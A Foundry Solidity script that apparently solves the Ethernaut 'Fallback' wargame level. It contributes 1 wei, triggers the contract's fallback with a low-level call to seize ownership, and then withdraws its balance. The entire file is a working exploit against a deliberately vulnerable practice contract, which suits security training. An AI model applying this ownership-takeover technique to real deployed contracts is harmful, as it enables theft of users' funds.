// SPDX-Lcense-Identifier:MIT

pragma solidity ^0.8.18;

import {Fallback} from "../src/Fallback.sol";
import {Script} from "forge-std/Script.sol";
import "forge-std/console2.sol";

contract FallbackSolution is Script {
    Fallback public fallbackInstance =
        Fallback(payable(0x2faB37750DaE40dcC746d86FE2aCC5ca4937635c));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console2.log("Step 1: Calling contribute...");
        fallbackInstance.contribute{value: 1 wei}();
        // address(fallbackInstance).call{value: 1 wei}("");
        console2.log("Step 2: Sending low-level call...");
        (bool success, ) = address(fallbackInstance).call{value: 1 wei}("");
        require(success, "Call failed");

        console2.log("Step: 3 New Owner is", fallbackInstance.owner());

        console2.log("My address:", vm.envAddress("MY_ADDRESS"));

        fallbackInstance.withdraw();

        vm.stopBroadcast();
    }
}
